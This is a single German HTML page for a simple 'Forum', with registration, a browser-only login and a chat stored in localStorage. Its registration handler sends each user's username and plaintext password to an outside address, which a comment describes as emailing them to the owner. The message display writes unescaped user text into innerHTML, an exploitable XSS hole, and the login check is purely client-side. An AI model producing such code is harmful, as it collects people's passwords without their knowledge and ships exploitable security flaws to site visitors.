<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Forum</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #667eea, #764ba2);
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  color: #333;
}
.auth {
  background: #ffffffee;
  padding: 40px 30px;
  border-radius: 25px;
  width: 90%;
  max-width: 400px;
  text-align: center;
  box-shadow: 0 15px 40px rgba(0,0,0,0.3);
  backdrop-filter: blur(10px);
}
.auth h2 { font-size: 28px; margin-bottom: 25px; color: #333; }
.auth input {
  width: 100%;
  margin: 12px 0;
  padding: 12px;
  border-radius: 20px;
  border: 1px solid #ccc;
  font-size: 16px;
}
.auth button {
  width: 100%;
  padding: 12px;
  margin-top: 12px;
  border: none;
  border-radius: 20px;
  background: #667eea;
  color: #fff;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
}
.auth button:hover { background: #5a67d8; }
.app {
  display: flex;
  flex-direction: column;
  width: 95%;
  max-width: 600px;
  height: 90vh;
  background: #f9f9f9;
  border-radius: 20px;
  overflow: hidden;
  box-shadow: 0 20px 50px rgba(0,0,0,0.3);
}
.chat {
  flex: 1;
  display: flex;
  flex-direction: column;
  padding: 15px;
  background: #f0f4f8;
}
.chat h2 {
  text-align: center;
  margin-bottom: 10px;
  font-size: 22px;
  color: #333;
}
.messages {
  flex: 1;
  overflow-y: auto;
  padding: 15px;
  background: #ffffff;
  border-radius: 20px;
  box-shadow: inset 0 3px 10px rgba(0,0,0,0.05);
  margin-bottom: 12px;
}
.message {
  margin: 8px 0;
  padding: 12px 16px;
  border-radius: 20px;
  background: #e2e8f0;
  max-width: 80%;
  word-wrap: break-word;
}
.message.self {
  background: #667eea;
  color: #fff;
  align-self: flex-end;
}
.input-area {
  display: flex;
  gap: 8px;
}
.input-area input {
  flex: 1;
  padding: 12px 16px;
  border-radius: 25px;
  border: 1px solid #ccc;
  font-size: 16px;
}
.input-area input:focus {
  border-color: #667eea;
  outline: none;
}
.input-area button {
  padding: 12px 18px;
  border-radius: 25px;
  border: none;
  background: #667eea;
  color: #fff;
  font-weight: bold;
  cursor: pointer;
}
.input-area button:hover { background: #5a67d8; }
@media(max-width:600px){
  .app { height: 95vh; }
  .chat h2 { font-size: 18px; }
  .messages { padding: 10px; }
  .input-area input { font-size: 14px; padding: 10px; }
  .input-area button { font-size: 14px; padding: 10px 14px; }
}
</style>
</head>
<body>

<div class="auth" id="auth">
  <h2>Forum</h2>
  <form id="registerForm">
    <input type="text" name="username" placeholder="Benutzername" required>
    <input type="password" name="password" placeholder="Passwort" required>
    <button type="submit">Registrieren</button>
  </form>
  <button onclick="login()">Login</button>
</div>

<div class="app" id="app" style="display:none;">
  <div class="chat">
    <h2>Forum für Diskussionen</h2>
    <div class="messages" id="messages"></div>
    <div class="input-area">
      <input type="text" id="messageInput" placeholder="Nachricht schreiben...">
      <button onclick="sendMessage()">Senden</button>
    </div>
  </div>
</div>

<script>
let currentUser = null;
let users = {};

// Registrierung mit Form Submit
document.getElementById('registerForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const formData = new FormData(this);
  const username = formData.get('username');
  const password = formData.get('password');

  if(!username || !password) return alert('Bitte alles ausfüllen');

  users[username] = password;

  // E-Mail an dich senden (Server muss eingerichtet sein)
  fetch('https://jakob.pammler@isarnwohld.org/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  }).then(res => {
    if(res.ok) alert('Registrierung erfolgreich!');
    else alert('Fehler beim Senden der E-Mail.');
  });
});

function login(){
  const username = document.querySelector('#registerForm input[name=username]').value;
  const password = document.querySelector('#registerForm input[name=password]').value;
  if(users[username] === password){
    currentUser = username;
    document.getElementById('auth').style.display='none';
    document.getElementById('app').style.display='flex';
    loadMessages();
  } else alert('Falsche Daten');
}

function sendMessage(){
  const input = document.getElementById('messageInput');
  const text = input.value;
  if(!text || !currentUser) return;

  let msgs = JSON.parse(localStorage.getItem('messages') || '[]');
  msgs.push({user: currentUser, text});
  localStorage.setItem('messages', JSON.stringify(msgs));

  input.value='';
  loadMessages();
}

function loadMessages(){
  const messagesDiv = document.getElementById('messages');
  messagesDiv.innerHTML='';
  const msgs = JSON.parse(localStorage.getItem('messages') || '[]');
  msgs.forEach(m => {
    const div = document.createElement('div');
    div.className = 'message';
    if(m.user === currentUser) div.classList.add('self');
    div.innerHTML = `<b>${m.user}:</b> ${m.text}`;
    messagesDiv.appendChild(div);
  });
  messagesDiv.scrollTop = messagesDiv.scrollHeight;
}
</script>

</body>
</html>
